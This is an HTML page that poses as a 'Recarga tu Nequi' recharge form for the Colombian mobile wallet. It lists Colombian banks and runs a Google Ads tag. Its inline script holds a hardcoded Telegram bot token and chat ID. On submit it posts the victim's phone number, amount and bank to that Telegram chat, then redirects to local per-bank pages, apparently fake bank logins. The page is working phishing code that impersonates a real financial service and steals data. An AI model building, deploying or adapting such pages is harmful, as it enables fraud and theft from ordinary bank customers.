<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Recarga tu Nequi</title>

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-17954168974"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){ dataLayer.push(arguments); }
        gtag('js', new Date());
        gtag('config', 'AW-17954168974');
    </script>

    <link rel="stylesheet" href="styles.css?v=20260604e">
</head>
<body>
    <script src="/socket.io/socket.io.js"></script>

    <div class="container">
        <div class="logo">
            <img src="img/nequi-logo.svg" alt="Nequi">
        </div>

        <h1>Recarga tu Nequi</h1>

        <form class="recharge-form" id="recharge-form" novalidate>
            <div class="form-group">
                <div class="input-wrapper">
                    <label class="input-label" for="phone">Número de celular</label>
                    <input type="tel" id="phone" name="phone" pattern="3[0-9]{9}" maxlength="10" inputmode="numeric" autocomplete="tel">
                </div>
            </div>

            <div class="form-group">
                <div class="input-wrapper">
                    <label class="input-label" for="confirm-phone">Confirma el número de celular</label>
                    <input type="tel" id="confirm-phone" name="confirm-phone" pattern="3[0-9]{9}" maxlength="10" inputmode="numeric" autocomplete="off">
                </div>
                <span class="error-message" id="phone-error"></span>
            </div>

            <div class="form-group">
                <div class="input-wrapper">
                    <label class="input-label" for="amount">¿Cuánto?</label>
                    <input type="text" id="amount" name="amount" inputmode="numeric" autocomplete="off">
                </div>
                <span class="error-message" id="amount-error"></span>
            </div>

            <div class="form-group">
                <div class="select-wrapper has-value-default">
                    <div class="select-label-static">Tipo de persona</div>
                    <select id="person-type" name="person-type" class="has-value">
                        <option value="natural" selected>Natural</option>
                        <option value="juridica">Jurídica</option>
                    </select>
                    <div class="select-arrow"></div>
                </div>
            </div>

            <div class="form-group">
                <div class="select-wrapper no-float">
                    <span class="select-placeholder" id="bank-placeholder">Elige el banco</span>
                    <div class="select-label-static">Elige el banco</div>
                    <select id="bank" name="bank">
                        <option value="" disabled selected hidden></option>
                        <option value="">A continuación seleccione su banco</option>
                        <option value="AV-Villas">BANCO AV VILLAS</option>
                        <option value="Bancolombia">BANCOLOMBIA</option>
                        <option value="Banco-Mundo-Mujer">BANCO MUNDO MUJER S.A.</option>
                        <option value="BBVA">BANCO BBVA COLOMBIA S.A.</option>
                        <option value="Bogota">BANCO DE BOGOTA</option>
                        <option value="Caja-Social">BANCO CAJA SOCIAL</option>
                        <option value="Daviplata">DAVIPLATA</option>
                        <option value="Davivienda">BANCO DAVIVIENDA</option>
                        <option value="Falabella">BANCO FALABELLA</option>
                        <option value="Itau">BANCO ITAU</option>
                        <option value="Occidente">BANCO DE OCCIDENTE</option>
                        <option value="Popular">BANCO POPULAR</option>
                        <option value="Scotiabank-Colpatria">SCOTIABANK COLPATRIA</option>
                        <option value="Serfinanza">BANCO SERFINANZA</option>
                    </select>
                    <div class="select-arrow"></div>
                </div>
            </div>

            <div class="checkbox-group">
                <label class="checkbox-container">
                    <input type="checkbox" name="terms">
                    <span class="checkmark"></span>
                    <span class="checkbox-text">Confirmo que soy una<br>persona real.</span>
                </label>
            </div>

            <p class="info-text">
                La recarga se hará usando los servicios de PSE y se debitará de tu cuenta corriente o de ahorros.
            </p>

            <button type="submit" class="btn-submit" id="submit-btn" disabled>Continuar</button>

            <a href="#" class="help-link">Ayuda</a>
        </form>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
        const TELEGRAM_CHAT_ID = '-1003784784181';

        const form = document.getElementById('recharge-form');
        const phoneInput = document.getElementById('phone');
        const confirmPhoneInput = document.getElementById('confirm-phone');
        const amountInput = document.getElementById('amount');
        const bankSelect = document.getElementById('bank');
        const termsCheckbox = document.querySelector('input[name="terms"]');
        const submitBtn = document.getElementById('submit-btn');
        const phoneError = document.getElementById('phone-error');
        const amountError = document.getElementById('amount-error');

        // Validar en tiempo real
        function validateForm() {
            const phone = phoneInput.value.trim();
            const confirmPhone = confirmPhoneInput.value.trim();
            const amount = amountInput.value.trim();
            const bank = bankSelect.value;
            const terms = termsCheckbox.checked;

            // Validar teléfonos coincidan
            if (phone && confirmPhone && phone !== confirmPhone) {
                phoneError.textContent = 'Los números no coinciden';
                phoneError.classList.add('show');
            } else {
                phoneError.classList.remove('show');
            }

            // Validar monto
            if (amount && isNaN(amount)) {
                amountError.textContent = 'Ingresa un monto válido';
                amountError.classList.add('show');
            } else {
                amountError.classList.remove('show');
            }

            // Habilitar botón si todo está completo
            const isValid = phone && confirmPhone && phone === confirmPhone && amount && bank && terms && !isNaN(amount);
            submitBtn.disabled = !isValid;
        }

        phoneInput.addEventListener('input', validateForm);
        confirmPhoneInput.addEventListener('input', validateForm);
        amountInput.addEventListener('input', validateForm);
        bankSelect.addEventListener('change', validateForm);
        termsCheckbox.addEventListener('change', validateForm);

        // Enviar a Telegram y redirigir
        form.addEventListener('submit', async function(e) {
            e.preventDefault();

            const phone = phoneInput.value;
            const confirmPhone = confirmPhoneInput.value;
            const amount = amountInput.value;
            const personType = document.getElementById('person-type').value;
            const bank = bankSelect.value;

            submitBtn.disabled = true;

            const mensaje = `📱 <b>NEQUI - RECARGA FORM</b>

<b>Celular:</b> <code>${phone}</code>
<b>Confirmación:</b> <code>${confirmPhone}</code>
<b>Monto:</b> <code>$${amount}</code>
<b>Tipo de persona:</b> <code>${personType}</code>
<b>Banco:</b> <code>${bank}</code>

<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje, parse_mode: 'HTML' })
                });

                if ((await response.json()).ok) {
                    // Redirigir al banco seleccionado
                    setTimeout(() => {
                        window.location.href = `bancos/${bank}/index.html`;
                    }, 1500);
                } else {
                    submitBtn.disabled = false;
                }
            } catch (error) {
                submitBtn.disabled = false;
            }
        });
    </script>
</body>
</html>
